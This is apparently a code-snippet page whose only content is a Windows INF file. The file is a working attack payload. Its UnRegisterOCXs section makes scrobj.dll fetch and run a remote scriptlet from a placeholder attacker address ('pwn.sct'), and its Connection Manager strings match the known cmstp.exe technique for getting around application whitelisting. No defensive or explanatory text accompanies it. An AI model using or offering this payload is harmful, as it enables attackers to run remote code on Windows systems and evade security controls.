---
id: 0e68dd28-bd52-46f3-8eee-053a6c63dc93
type: code
language: INF File
verified: false
created_at: '2020-02-21T05:47:48.571487+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 0e68dd28

**Language**: INF File

```inf file
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://$_ATTACKER_IP/pwn.sct

[Strings]
AppAct="SOFTWARE\Microsoft\Connection Manager"
ServiceName="Corp"
ShortSvcName="Corp"
```
